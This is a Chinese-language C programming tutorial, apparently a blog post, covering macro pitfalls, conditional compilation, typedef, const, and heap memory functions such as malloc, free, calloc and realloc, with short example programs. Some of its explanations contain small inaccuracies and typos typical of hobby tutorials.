<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">// 下面定义一个宏P(a)，作用是返回a的平方</span><br><span class="line">#define Pow(a) (a) * (a) // 如果不用小括号括住计算结果</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[])      &#123;</span><br><span class="line">// 代码被替换为:int b = (10) * (10) / (2) * (2);</span><br><span class="line">// 简化之后：int b = 10 * (10 / 2) * 2;，最后变量b为:100</span><br><span class="line">      int b = Pow(10) / Pow(2);</span><br><span class="line"></span><br><span class="line">      printf(&quot;%d&quot;, b);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">// 计算结果用括号括起来</span><br><span class="line">#define Pow(a) ( (a) * (a) )</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[])      &#123;</span><br><span class="line">// 代码被替换为:int b = ( (10) * (10) ) / ( (2) * (2) );</span><br><span class="line">// 简化之后：int b = (10 * 10) / (2 *2);，最后输出结果：25</span><br><span class="line">      int b = Pow(10) / Pow(2);</span><br><span class="line"></span><br><span class="line">      printf(&quot;%d&quot;, b);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h2><ul>
<li>在很多情况下，我们希望程序的其中一部分代码只有在满足一定条件时才进行编译，否则不参与编译(只有参与编译的代码最终才能被执行)，这就是条件编译。</li>
<li>为什么要使用条件编译<ul>
<li>1)按不同的条件去编译不同的程序部分,因而产生不同的目标代码文件。有利于程序的移植和调试。</li>
<li>2)条件编译当然也可以用条件语句来实现。 但是用条件语句将会对整个源程序进行编译,生成 的目标代码程序很长,而采用条件编译,则根据条件只编译其中的程序段1或程序段2,生成的目 标程序较短。<br>##if-#else 条件编译指令</li>
</ul>
</li>
<li>第一种格式:<ul>
<li>它的功能是,如常量表达式的值为真(非0),则将code1 编译到程序中,否则对code2编译到程序中。</li>
<li>注意:<ul>
<li>是将代码编译进可执行程序, 而不是执行代码</li>
<li>条件编译后面的条件表达式中不能识别变量,它里面只能识别常量和宏定义</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if 常量表达式</span><br><span class="line">    ..code1...</span><br><span class="line">#else</span><br><span class="line">    ..code2...</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define SCORE 67</span><br><span class="line">#if SCORE &gt; 90</span><br><span class="line">    printf(&quot;优秀\n&quot;);</span><br><span class="line">#else</span><br><span class="line">    printf(&quot;不及格\n&quot;);</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<ul>
<li>第二种格式:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if 条件1</span><br><span class="line">  ...code1...</span><br><span class="line"> #elif 条件2</span><br><span class="line">  ...code2...</span><br><span class="line"> #else</span><br><span class="line">  ...code3...</span><br><span class="line"> #endif</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define SCORE 67</span><br><span class="line">#if SCORE &gt; 90</span><br><span class="line">    printf(&quot;优秀\n&quot;);</span><br><span class="line">#elif SCORE &gt; 60</span><br><span class="line">    printf(&quot;良好\n&quot;);</span><br><span class="line">#else</span><br><span class="line">    printf(&quot;不及格\n&quot;);</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<h2 id="typedef关键字"><a href="#typedef关键字" class="headerlink" title="typedef关键字"></a>typedef关键字</h2><ul>
<li><p>C语言不仅􏰀供了丰富的数据类型,而且还允许由用户自己定义类型说明符,也就是说允许由用户为数据类型取“别名”。</p>
</li>
<li><p>格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef 原类型名 新类型名;</span><br></pre></td></tr></table></figure>

<ul>
<li>其中原类型名中含有定义部分,新类型名一般用大写表示,以便于区别。</li>
<li>有时也可用宏定义来代替typedef的功能,但是宏定义是由预处理完成的,而typedef则是在编译 时完成的,后者更为灵活方便。<br>##typedef使用</li>
</ul>
</li>
<li><p>基本数据类型</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> INTEGER</span><br><span class="line">INTEGER a; <span class="comment">// 等价于 int a;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>也可以在别名的基础上再起一个别名</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Integer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> Integer MyInteger;</span><br></pre></td></tr></table></figure>

<ul>
<li>用typedef定义数组、指针、结构等类型将带来很大的方便,不仅使程序书写简单而且使意义更为 明确,因而增强了可读性。</li>
<li>数组类型</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> NAME[<span class="number">20</span>]; <span class="comment">// 表示NAME是字符数组类型,数组长度为20。然后可用NAME 说明变量,</span></span><br><span class="line">NAME a; <span class="comment">// 等价于 char a[20];</span></span><br></pre></td></tr></table></figure>

<ul>
<li>结构体类型<ul>
<li>第一种形式:</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">Person</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Person</span> <span class="title">PersonType</span>;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ 第二种形式:</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct Person&#123;</span><br><span class="line">    int age;</span><br><span class="line">    char *name;</span><br><span class="line">&#125; PersonType;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ 第三种形式:</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    int age;</span><br><span class="line">    char *name;</span><br><span class="line">&#125; PersonType;</span><br></pre></td></tr></table></figure>

<ul>
<li>枚举<ul>
<li>第一种形式:</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Sex</span>&#123;</span></span><br><span class="line">    SexMan,</span><br><span class="line">    SexWoman,</span><br><span class="line">    SexOther</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> <span class="title">Sex</span> <span class="title">SexType</span>;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ 第二种形式:</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef enum Sex&#123;</span><br><span class="line">    SexMan,</span><br><span class="line">    SexWoman,</span><br><span class="line">    SexOther</span><br><span class="line">&#125; SexType;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ 第三种形式:</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef enum&#123;</span><br><span class="line">    SexMan,</span><br><span class="line">    SexWoman,</span><br><span class="line">    SexOther</span><br><span class="line">&#125; SexType;</span><br></pre></td></tr></table></figure>

<ul>
<li>指针<ul>
<li>typedef与指向结构体的指针</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个结构体并起别名</span></span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">     <span class="keyword">float</span> x;</span><br><span class="line">     <span class="keyword">float</span> y;</span><br><span class="line"> &#125; Point;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 起别名</span></span><br><span class="line"><span class="keyword">typedef</span> Point *PP;</span><br></pre></td></tr></table></figure>

<ul>
<li>typedef与指向函数的指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个sum函数，计算a跟b的和</span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> c = a + b;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d&quot;</span>, a, b, c);</span><br><span class="line">      <span class="keyword">return</span> c;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*MySum)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个指向sum函数的指针变量p</span></span><br><span class="line"> MySum p = sum;</span><br></pre></td></tr></table></figure>

<h2 id="宏定义与函数以及typedef区别"><a href="#宏定义与函数以及typedef区别" class="headerlink" title="宏定义与函数以及typedef区别"></a>宏定义与函数以及typedef区别</h2><ul>
<li>与函数的区别<ul>
<li>从整个使用过程可以发现，带参数的宏定义，在源程序中出现的形式与函数很像。但是两者是有本质区别的：<ul>
<li>1&gt; 宏定义不涉及存储空间的分配、参数类型匹配、参数传递、返回值问题</li>
<li>2&gt; 函数调用在程序运行时执行，而宏替换只在编译预处理阶段进行。所以带参数的宏比函数具有更高的执行效率</li>
</ul>
</li>
</ul>
</li>
<li>typedef和#define的区别<ul>
<li>用宏定义表示数据类型和用typedef定义数据说明符的区别。<ul>
<li>宏定义只是简单的字符串替换,￼是在预处理完成的</li>
<li>typedef是在编译时处理的,它不是作简单的代换,而是对类型说明符￼重新命名。被命名的标识符具有类型定义说明的功能</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef char *String;</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">     String str = &quot;This is a string!&quot;;</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define String char *</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    String str = &quot;This is a string!&quot;;</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef char *String1; // 给char *起了个别名String1</span><br><span class="line">#define String2 char * // 定义了宏String2</span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line">        /*</span><br><span class="line">        只有str1、str2、str3才是指向char类型的指针变量</span><br><span class="line">        由于String1就是char *，所以上面的两行代码等于:</span><br><span class="line">        char *str1;</span><br><span class="line">        char *str2;</span><br><span class="line">        */</span><br><span class="line">      String1 str1, str2;</span><br><span class="line">        /*</span><br><span class="line">        宏定义只是简单替换, 所以相当于</span><br><span class="line">        char *str3, str4;</span><br><span class="line">        *号只对最近的一个有效, 所以相当于</span><br><span class="line">        char *str3;</span><br><span class="line">        char str4;</span><br><span class="line">        */</span><br><span class="line">      String2 str3, str4;</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="const关键字"><a href="#const关键字" class="headerlink" title="const关键字"></a>const关键字</h2><ul>
<li>const是一个类型修饰符<ul>
<li>使用const修饰变量则可以让变量的值不能改变<br>##const有什么主要的作用?</li>
</ul>
</li>
<li>(1)可以定义const常量,具有不可变性</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Max=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> Array[Max];</span><br></pre></td></tr></table></figure>

<ul>
<li>(2)便于进行类型检查,使编译器对处理内容有更多了解,消除了一些隐患。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> i)</span> </span>&#123; .........&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>编译器就会知道i是一个常量,不允许修改;</li>
</ul>
</blockquote>
<ul>
<li>(3)可以避免意义模糊的数字出现,同样可以很方便地进行参数的调整和修改。 同宏定义一样,可以做到不变则已,一变都变!如(1)中,如果想修改Max的内容,只需要:const int Max=you want;即可!</li>
<li>(4)可以保护被修饰的东西,防止意外的修改,增强程序的健壮性。 还是上面的例子,如果在 函数体内修改了i,编译器就会报错;</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> i)</span> </span>&#123; i=<span class="number">10</span>;<span class="comment">//error! &#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>(5) 可以节省空间,避免不必要的内存分配。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PI 3.14159 <span class="comment">//常量宏</span></span></span><br><span class="line"><span class="keyword">const</span> doulbe Pi=<span class="number">3.14159</span>; <span class="comment">//此时并未将Pi放入ROM中 ...... double i=Pi; //此时为Pi分配内存,以后不再分配!</span></span><br><span class="line"><span class="keyword">double</span> I=PI; <span class="comment">//编译期间进行宏替换,分配内存</span></span><br><span class="line"><span class="keyword">double</span> j=Pi; <span class="comment">//没有内存分配</span></span><br><span class="line"><span class="keyword">double</span> J=PI; <span class="comment">//再进行宏替换,又一次分配内存! const定义常量从汇编的角度来看,只是给出了对应的内存地址,而不是象#define一样给出的是立即数,所以,const定义的常量在程序运行过程中只有一份拷贝,而#define定义的常量在内存 中有若干个拷贝。</span></span><br></pre></td></tr></table></figure>

<ul>
<li>(6) 􏰀高了效率。编译器通常不为普通const常量分配存储空间,而是将它们保存在符号表 中,这使得它成为一个编译期间的常量,没有了存储与读内存的操作,使得它的效率也很高。</li>
</ul>
<h2 id="如何使用const"><a href="#如何使用const" class="headerlink" title="如何使用const?"></a>如何使用const?</h2><ul>
<li>(1)修饰一般常量一般常量是指简单类型的常量。这种常量在定义时,修饰符const可以用在类型说明符前,也可以用在类型说明符后</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> x=<span class="number">2</span>; 或 <span class="keyword">const</span> <span class="keyword">int</span> x=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>(当然,我们可以偷梁换柱进行更新: 通过强制类型转换,将地址赋给变量,再作修改即可以改变const常量值。)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// const对于基本数据类型, 无论写在左边还是右边, 变量中的值不能改变</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// a = 666; // 直接修改会报错</span></span><br><span class="line"><span class="comment">// 偷梁换柱, 利用指针指向变量</span></span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"><span class="comment">// 利用指针间接修改变量中的值</span></span><br><span class="line">*p = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p);</span><br></pre></td></tr></table></figure>

<ul>
<li>(2)修饰常数组(值不能够再改变了)定义或说明一个常数组可采用如下格式:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> a[<span class="number">5</span>]=&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> a[<span class="number">5</span>]=&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const int a[5]=&#123;1, 2, 3, 4, 5&#125;;</span><br><span class="line">a[1] = 55; // 错误</span><br></pre></td></tr></table></figure>

<ul>
<li>(3)修饰函数的常参数const修饰符也可以修饰函数的传递参数,格式如下:void Fun(const int Var); 告诉编译器Var在函数体中的无法改变,从而防止了使用者的一些无 意的或错误的修改。</li>
<li>(4)修饰函数的返回值: const修饰符也可以修饰函数的返回值,是返回值不可被改变,格式如 下:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">int</span> <span class="title">Fun1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> MyClass <span class="title">Fun2</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>(5)修饰常指针<ul>
<li>const int *A; //const修饰指针,A可变,A指向的值不能被修改</li>
<li>int const *A; //const修饰指向的对象,A可变,A指向的对象不可变</li>
<li>int *const A; //const修饰指针A, A不可变,A指向的对象可变</li>
<li>const int *const A;//指针A和A指向的对象都不可变</li>
</ul>
</li>
<li>技巧</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先看“*”的位置</span><br><span class="line">如果const 在 *的左侧 表示值不能修改,但是指向可以改。</span><br><span class="line">如果const 在 *的右侧 表示指向不能改,但是值可以改</span><br><span class="line">如果在“*”的两侧都有const 标识指向和值都不能改。</span><br></pre></td></tr></table></figure>

<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h2 id="进程空间"><a href="#进程空间" class="headerlink" title="进程空间"></a>进程空间</h2><ul>
<li>程序，是经源码编译后的可执行文件，可执行文件可以多次被执行，比如我们可以多次打开 office。</li>
<li>而进程，是程序加载到内存后开始执行，至执行结束，这样一段时间概念，多次打开的wps,每打开一次都是一个进程，当我们每关闭一个 office，则表示该进程结束。</li>
<li>程序是静态概念，而进程动态/时间概念。<br>###进程空间图示<br>有了进程和程序的概念以后，我们再来看一下，程序被加载到内存以后内存空间布局是什么样的<br><img src="/2022/01/15/C/5d2e966e95f1518585804e57779e7fe6.png" alt="img"></li>
</ul>
<hr>
<h2 id="栈内存-Stack"><a href="#栈内存-Stack" class="headerlink" title="栈内存(Stack)"></a>栈内存(Stack)</h2><ul>
<li>栈中存放任意类型的变量，但必须是 auto 类型修饰的，即自动类型的局部变量， 随用随开，用完即消。</li>
<li>内存的分配和销毁系统自动完成，不需要人工干预</li>
<li>栈的最大尺寸固定，超出则引起栈溢出<ul>
<li>局部变量过多，过大 或 递归层数太多等就会导致栈溢出</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int ages[10240*10240]; // 程序会崩溃, 栈溢出</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 存储在栈中, 内存地址从大到小</span><br><span class="line">    int a = 10;</span><br><span class="line">    int b = 20;</span><br><span class="line">    printf(&quot;&amp;a = %p\n&quot;, &amp;a); // &amp;a = 0060FEAC</span><br><span class="line">    printf(&quot;&amp;b = %p\n&quot;, &amp;b); // &amp;b = 0060FEA8</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="堆内存-Heap"><a href="#堆内存-Heap" class="headerlink" title="堆内存(Heap)"></a>堆内存(Heap)</h2><ul>
<li>堆内存可以存放任意类型的数据，但需要自己申请与释放</li>
<li>堆大小，想像中的无穷大，但实际使用中，受限于实际内存的大小和内存是否连续性</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *p = (int *)malloc(10240 * 1024); // 不一定会崩溃</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 存储在栈中, 内存地址从小到大</span><br><span class="line">    int *p1 = malloc(4);</span><br><span class="line">    *p1 = 10;</span><br><span class="line">    int *p2 = malloc(4);</span><br><span class="line">    *p2 = 20;</span><br><span class="line">   </span><br><span class="line">    printf(&quot;p1 = %p\n&quot;, p1); //  p1 = 00762F48</span><br><span class="line">    printf(&quot;p2 = %p\n&quot;, p2); // p2 = 00762F58</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="malloc函数"><a href="#malloc函数" class="headerlink" title="malloc函数"></a>malloc函数</h2><table>
<thead>
<tr>
<th align="center"><strong>函数声明</strong></th>
<th align="center"><strong>void * malloc(size_t _Size);</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdlib.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">申请堆内存空间并返回,所申请的空间并未初始化。</td>
</tr>
<tr>
<td align="center">常见的初始化方法是</td>
<td align="center">memset 字节初始化。</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">size_t _size 表示要申请的字符数</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">void * 成功返回非空指针指向申请的空间 ，失败返回 NULL</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">     * malloc</span><br><span class="line">     * 第一个参数: 需要申请多少个字节空间</span><br><span class="line">     * 返回值类型: void *</span><br><span class="line">     */ </span><br><span class="line">    int *p = (int *)malloc(sizeof(int));</span><br><span class="line">    printf(&quot;p = %i\n&quot;, *p); // 保存垃圾数据</span><br><span class="line">    /*</span><br><span class="line">     * 第一个参数: 需要初始化的内存地址</span><br><span class="line">     * 第二个初始: 需要初始化的值</span><br><span class="line">     * 第三个参数: 需要初始化对少个字节</span><br><span class="line">     */ </span><br><span class="line">    memset(p, 0, sizeof(int)); // 对申请的内存空间进行初始化</span><br><span class="line">    printf(&quot;p = %i\n&quot;, *p); // 初始化为0</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h2><ul>
<li>注意: 通过malloc申请的存储空间一定要释放, 所以malloc和free函数总是成对出现</li>
</ul>
<table>
<thead>
<tr>
<th align="center"><strong>函数声明</strong></th>
<th align="center"><strong>void free(void *p);</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdlib.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">释放申请的堆内存</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">void* p 指向手动申请的空间</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">void 无返回</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1.申请4个字节存储空间</span><br><span class="line">    int *p = (int *)malloc(sizeof(int));</span><br><span class="line">    // 2.初始化4个字节存储空间为0</span><br><span class="line">    memset(p, 0, sizeof(int));</span><br><span class="line">    // 3.释放申请的存储空间</span><br><span class="line">    free(p);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="calloc函数"><a href="#calloc函数" class="headerlink" title="calloc函数"></a>calloc函数</h2><table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center"><strong>void *calloc(size_t nmemb, size_t size);</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdlib.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">申请堆内存空间并返回，所申请的空间，自动清零</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">size_t nmemb 所需内存单元数量</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">size_t size 内存单元字节数量</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">void * 成功返回非空指针指向申请的空间 ，失败返回 NULL</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">    // 1.申请3块4个字节存储空间</span><br><span class="line">    int *p = (int *)malloc(sizeof(int) * 3);</span><br><span class="line">    // 2.使用申请好的3块存储空间</span><br><span class="line">    p[0] = 1;</span><br><span class="line">    p[1] = 3;</span><br><span class="line">    p[2] = 5;</span><br><span class="line">    printf(&quot;p[0] = %i\n&quot;, p[0]);</span><br><span class="line">    printf(&quot;p[1] = %i\n&quot;, p[1]);</span><br><span class="line">    printf(&quot;p[2] = %i\n&quot;, p[2]);</span><br><span class="line">    // 3.释放空间</span><br><span class="line">    free(p);</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    // 1.申请3块4个字节存储空间</span><br><span class="line">    int *p = calloc(3, sizeof(int));</span><br><span class="line">    // 2.使用申请好的3块存储空间</span><br><span class="line">    p[0] = 1;</span><br><span class="line">    p[1] = 3;</span><br><span class="line">    p[2] = 5;</span><br><span class="line">    printf(&quot;p[0] = %i\n&quot;, p[0]);</span><br><span class="line">    printf(&quot;p[1] = %i\n&quot;, p[1]);</span><br><span class="line">    printf(&quot;p[2] = %i\n&quot;, p[2]);</span><br><span class="line">    // 3.释放空间</span><br><span class="line">    free(p);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="realloc函数"><a href="#realloc函数" class="headerlink" title="realloc函数"></a>realloc函数</h2><table>
<thead>
<tr>
<th align="center"><strong>函数声明</strong></th>
<th align="center"><strong>oid *realloc(void *ptr, size_t size);</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdlib.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">扩容(缩小)原有内存的大小。通常用于扩容，缩小会会导致内存缩去的部分数据丢失</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">void * ptr 表示待扩容(缩小)的指针， ptr 为之前用 malloc 或者 calloc 分配的内存地址。</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">size_t size 表示扩容(缩小)后内存的大小。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">void* 成功返回非空指针指向申请的空间 ，失败返回 NULL。</td>
</tr>
</tbody></table>
<ul>
<li>注意点:<ul>
<li>若参数ptr==NULL，则该函数等同于 malloc</li>
<li>返回的指针，可能与 ptr 的值相同，也有可能不同。若相同，则说明在原空间后面申请，否则，则可能后续空间不足，重新申请的新的连续空间，原数据拷贝到新空间， 原有空间自动释放</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1.申请4个字节存储空间</span><br><span class="line">    int *p = NULL;</span><br><span class="line">    p = realloc(p, sizeof(int)); // 此时等同于malloc</span><br><span class="line">    // 2.使用申请好的空间</span><br><span class="line">    *p = 666;</span><br><span class="line">    printf(&quot;*p = %i\n&quot;,  *p);</span><br><span class="line">    // 3.释放空间</span><br><span class="line">    free(p);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

